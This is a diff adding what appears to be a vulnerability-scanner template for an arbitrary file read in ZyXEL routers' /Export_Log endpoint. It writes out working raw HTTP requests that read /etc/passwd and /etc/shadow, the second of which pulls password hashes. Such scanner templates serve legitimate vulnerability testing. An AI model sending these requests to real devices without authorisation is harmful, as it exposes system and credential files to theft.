@@ -1,0 +1,37 @@
+id: zyxel-export-log-file-read
+
+info:
+  name: ZyXEL routers Export_Log arbitrary file read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Several ZyXEL routers have an arbitrary file read vulnerability in the `/Export_Log` endpoint.
+    This allows attackers to read sensitive files like `/etc/passwd`.
+  tags: file-read
+
+http:
+  - raw:
+      - |
+        GET /Export_Log?/etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+
+  - raw:
+      - |
+        GET /Export_Log?{{filePath}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+variables:
+  filePath: "/etc/shadow"
